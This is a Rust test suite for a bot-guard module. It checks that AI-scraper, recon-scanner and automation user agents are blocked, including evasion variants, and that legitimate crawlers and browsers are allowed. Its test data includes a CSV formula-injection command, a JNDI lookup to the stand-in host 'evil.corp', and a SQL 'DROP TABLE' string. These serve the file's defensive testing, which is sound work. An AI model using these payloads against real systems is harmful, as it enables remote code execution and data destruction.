//! # Sovereign Adversarial Self-Attack TDD Suite: Bot Guard & User-Agent Interception
//!
//! Asserts mathematical resilience under hostile, non-cooperative conditions:
//! 1. Case-insensitivity & Evasion Mutation Fuzzing (Mixed case, tabs, whitespace)
//! 2. Terminal Escape Poisoning & ANSI Injection in User-Agent
//! 3. Formula Injection & Code Execution Payloads in User-Agent
//! 4. Resource Exhaustion & Memory Allocation Bombs (64KB - 1MB headers)
//! 5. Null Byte Injection & Boundary Corruptions
//! 6. Full Old-vs-New Name Coverage across Anthropic, OpenAI, Meta, Google, ByteDance
//! 7. Zero False Positives for Legitimate Search Crawlers & Human Browsers

use phylax::bot_guard::{
    BotCategory, BotGuard, AI_SCRAPER_SIGNATURES, AUTOMATION_TOOL_SIGNATURES,
    LEGITIMATE_SEARCH_SIGNATURES, RECON_SCANNER_SIGNATURES,
};

#[test]
fn test_adversarial_full_old_and_new_name_registry() {
    let guard = BotGuard::new();

    // Verify all registered AI scraper signatures trigger BotCategory::AiScraper
    for &(needle, display_name) in AI_SCRAPER_SIGNATURES {
        let ua = format!("TestAgent/1.0 (+http://scanner.local; {})", needle);
        let (cat, matched) = guard.classify(&ua);
        assert_eq!(
            cat,
            BotCategory::AiScraper,
            "Failed to classify AI Scraper needle: '{}' ({})",
            needle,
            display_name
        );
        assert!(matched.is_some(), "Matched token should be present for: {}", needle);
    }

    // Verify all registered Recon signatures trigger BotCategory::ReconScanner
    for &(needle, display_name) in RECON_SCANNER_SIGNATURES {
        let ua = format!("TestAgent/1.0 (+http://scanner.local; {})", needle);
        let (cat, matched) = guard.classify(&ua);
        assert_eq!(
            cat,
            BotCategory::ReconScanner,
            "Failed to classify Recon needle: '{}' ({})",
            needle,
            display_name
        );
        assert!(matched.is_some(), "Matched token should be present for: {}", needle);
    }

    // Verify all registered Automation signatures trigger BotCategory::AutomationTool
    for &(needle, display_name) in AUTOMATION_TOOL_SIGNATURES {
        let ua = format!("TestAgent/1.0 (+http://scanner.local; {})", needle);
        let (cat, matched) = guard.classify(&ua);
        assert_eq!(
            cat,
            BotCategory::AutomationTool,
            "Failed to classify Automation needle: '{}' ({})",
            needle,
            display_name
        );
        assert!(matched.is_some(), "Matched token should be present for: {}", needle);
    }

    // Verify all registered Search engines trigger BotCategory::LegitimateSearch
    for &(needle, display_name) in LEGITIMATE_SEARCH_SIGNATURES {
        let ua = format!("Mozilla/5.0 (compatible; {}; +http://search.engine/bot.html)", needle);
        let (cat, _) = guard.classify(&ua);
        assert_eq!(
            cat,
            BotCategory::LegitimateSearch,
            "Failed to classify Search needle: '{}' ({})",
            needle,
            display_name
        );
    }
}

#[test]
fn test_adversarial_case_mutation_and_evasion_fuzzing() {
    let guard = BotGuard::new();

    let mutations = [
        "cLaUdE-sEaRcHbOt/1.0",
        "CLAUDEBOT/2.0",
        "gPtBoT/1.0",
        "OaI-sEaRcHbOt/1.0",
        "bUiLtWiTh/1.4",
        "cEnSySiNsPeCt/1.1",
        "CENSYS/2.0",
        "sEmRuShBoT/7.0",
        "bYtEsPiDeR/1.0",
        "GoOgLe-ExTeNdEd/1.0",
        "   \t\t Claude-SearchBot/1.0 \r\n  ",
        "Mozilla/5.0 (Windows NT 10.0) CLAUDE-SEARCHBOT/1.0",
    ];

    for ua in mutations {
        let (cat, _) = guard.classify(ua);
        assert!(
            cat.is_unwanted(),
            "Evasion mutation bypassed classifier: '{}'",
            ua
        );
        let verdict = guard.evaluate_perimeter(Some(ua), "/sitemap.xml");
        assert!(
            verdict.is_blocked(),
            "Evasion mutation bypassed perimeter guard: '{}'",
            ua
        );
    }
}

#[test]
fn test_adversarial_terminal_ansi_poisoning() {
    let guard = BotGuard::new();

    // Malicious agents injecting ANSI CSI / OSC terminal escapes into User-Agent
    let malicious_uas = [
        "\x1b[31;1mClaude-SearchBot\x1b[0m",
        "\x1b]0;Pwned\x07BuiltWith/1.4",
        "\x1b[2J\x1b[HGPTBot/1.0",
        "\x1b[?25hCensysInspect/1.1\x1b[?25l",
    ];

    for ua in malicious_uas {
        let verdict = guard.evaluate_perimeter(Some(ua), "/tools");
        assert!(
            verdict.is_blocked(),
            "ANSI poisoned User-Agent should be blocked: {:?}",
            ua
        );
    }
}

#[test]
fn test_adversarial_formula_and_code_injection() {
    let guard = BotGuard::new();

    let injection_payloads = [
        "=cmd|' /C calc'!A0 Claude-SearchBot",
        "@SUM(1+1)*cmd|' /C calc'!A0 BuiltWith",
        "${jndi:ldap://evil.corp/a} GPTBot",
        "{{7*7}} CensysInspect",
        "'; DROP TABLE users; -- Bytespider",
    ];

    for ua in injection_payloads {
        let verdict = guard.evaluate_perimeter(Some(ua), "/");
        assert!(
            verdict.is_blocked(),
            "Injection payload containing bot signature must be trapped: '{}'",
            ua
        );
    }
}

#[test]
fn test_adversarial_null_bytes_and_corrupted_boundaries() {
    let guard = BotGuard::new();

    let corruptions = [
        "Claude-SearchBot\0ExtraData",
        "\0\0\0GPTBot/1.0",
        "BuiltWith\0\0\0",
        "Mozilla/5.0\0CensysInspect/1.1",
    ];

    for ua in corruptions {
        let verdict = guard.evaluate_perimeter(Some(ua), "/downloads");
        assert!(
            verdict.is_blocked(),
            "Corrupted null-byte payload must still be identified: {:?}",
            ua
        );
    }
}

#[test]
fn test_adversarial_allocation_bomb_and_buffer_flooding() {
    let guard = BotGuard::new();

    // 64 KB User-Agent with needle hidden near the end
    let mut huge_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ".repeat(1500);
    huge_ua.push_str(" Claude-SearchBot/1.0");

    let timer = std::time::Instant::now();
    let verdict = guard.evaluate_perimeter(Some(&huge_ua), "/");
    let elapsed = timer.elapsed();

    assert!(verdict.is_blocked(), "Needle in huge buffer was not caught");
    // Verify sub-millisecond execution despite 64KB scan
    assert!(
        elapsed < std::time::Duration::from_millis(5),
        "64KB User-Agent scan took too long: {:?}",
        elapsed
    );
}

#[test]
fn test_adversarial_zero_false_positives_for_search_and_browsers() {
    let guard = BotGuard::new();

    let legitimate_clients = [
        // Google Search
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        // Bing Search
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        // DuckDuckGo
        "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
        // Applebot (Search, not extended)
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)",
        // Real Browsers
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36",
    ];

    for ua in legitimate_clients {
        let verdict = guard.evaluate_perimeter(Some(ua), "/tools");
        assert!(
            verdict.is_allowed(),
            "Legitimate client was falsely blocked: '{}'",
            ua
        );
    }
}
